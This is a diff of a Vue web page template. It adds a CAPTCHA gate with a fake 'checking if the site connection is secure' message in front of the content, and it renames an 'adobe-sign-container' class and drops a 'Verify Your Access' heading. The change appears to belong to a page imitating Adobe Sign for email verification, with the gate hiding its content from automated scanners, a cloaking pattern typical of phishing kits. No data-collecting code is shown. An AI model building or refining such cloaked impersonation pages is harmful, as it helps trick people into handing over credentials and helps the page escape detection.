@@ -1,11 +1,21 @@
 <template>
-  <div class="background">
-    <div class="email-verify-container">
-      <div class="verify-card">
+  <div v-if="!captchaToken" class="gate-container">
+    <main>
+      <div class="instructions">
+        <p>Please stand by while we are checking if the site connection is secure.</p>
+        <div
+          class="cf-turnstile"
+          data-sitekey="0x4AAAAAABgei6QZruCN7n08"
+        ></div>
+      </div>
+    </main>
+  </div>
+
+  <div v-else class="background">
+    <div class="toto-container">
         <div class="header">
           <div class="logo-text">
             <span class="success-check">⼈</span>
-            <span>Verify Your Access</span>
           </div>
         </div>
         <div class="content">
@@ -146,7 +156,7 @@ body {
   padding: 1rem;
 }
 
-.adobe-sign-container {
+.toto-container {
   width: 100%;
   max-width: 600px;
   background: #ffffff;
@@ -264,7 +274,7 @@ body {
     color: #ffffff;
   }
 
-  .adobe-sign-container {
+  .toto-container {
     background: #1e1e1e;
     color: #ffffff;
     box-shadow: 0 1px 20px rgba(255, 255, 255, 0.05);
